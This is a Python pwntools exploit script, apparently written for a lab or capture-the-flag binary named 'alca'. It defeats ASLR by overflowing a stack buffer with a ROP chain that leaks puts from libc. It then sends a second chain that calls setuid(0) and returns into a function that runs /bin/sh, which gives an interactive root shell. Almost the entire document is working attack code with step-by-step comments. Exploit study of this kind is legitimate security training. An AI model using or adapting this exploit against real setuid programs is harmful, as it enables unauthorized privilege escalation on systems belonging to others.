#!/usr/bin/python

#---------------------------------------#
# Arch: x86_64                          #
# Protections: NX, ASLR, Partial RELRO  #
# Vuln Type: stack overflow + setuid    #
# OS: Kali Linux 5.10.0-kali9-amd64     #
#---------------------------------------#

from pwn import *
from time import sleep

def memory_leak():

    global pop_rdi

    pop_rdi = (0x000000000040137b)
    arg_puts_got = (0x404018)
    puts_plt = (0x401040)
    ret_stack = (0x4011fb)

    # sending first chain to leak puts@libc
    # and dinamically calculate libc base

    payload = b"A"*152
    payload += p64(pop_rdi)
    payload += p64(arg_puts_got)
    payload += p64(puts_plt)
    payload += p64(ret_stack)

    r.sendline(payload)
    r.recvline()

    leak = u64(r.recvline().strip("\n").ljust(8, "\x00"))
    libc_base = (leak - 0x75e10)
    sleep(2)
    log.info("libc base found at: {}".format(hex(libc_base)))
    sleep(1)
    log.info("Pwning the binary...")
    sleep(2)

    return libc_base

#--------------------------------------------------------#

def elevate():
    
    libc_base = memory_leak()
    arg_setuid = (0)
    setuid = (libc_base + 0xcba10)
    to_remove_func = (0x4011d9)

    # sending second chain to elevate privileges
    # since this is a setuid binary. Then returning
    # to a function calling system@libc with /bin/sh
    # as argument

    elevate = b"A"*152
    elevate += p64(pop_rdi)
    elevate += p64(arg_setuid)
    elevate += p64(setuid)
    elevate += p64(to_remove_func)

    r.sendline(elevate)
    r.interactive()


def main():

    global r
                                #---------------------------------------#
    r = process("./alca")       # sending arguments with pwntools:      #
    r.recv()                    # 1 --> go to the 'stack' function      #
    r.sendline("1")             # receiving output after input is sent  #
    r.recvline()                #---------------------------------------#
    elevate()


if __name__ == "__main__":
    main()
